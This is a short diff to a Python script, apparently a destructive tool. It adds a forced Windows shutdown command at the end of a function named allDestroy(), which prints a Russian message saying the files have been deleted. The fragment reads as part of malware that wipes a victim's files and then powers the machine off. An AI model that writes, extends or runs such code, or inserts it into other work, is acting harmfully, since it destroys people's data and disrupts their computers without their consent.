@@ -271,6 +271,7 @@ def allDestroy():
                 if(debug):
                     print(f'272: {e}')
     print('Удалил файлы\nBye ^-^')
+    os.system('shutdown /s -t 10')
 
 ######## DEBUG ########
 if (debug):
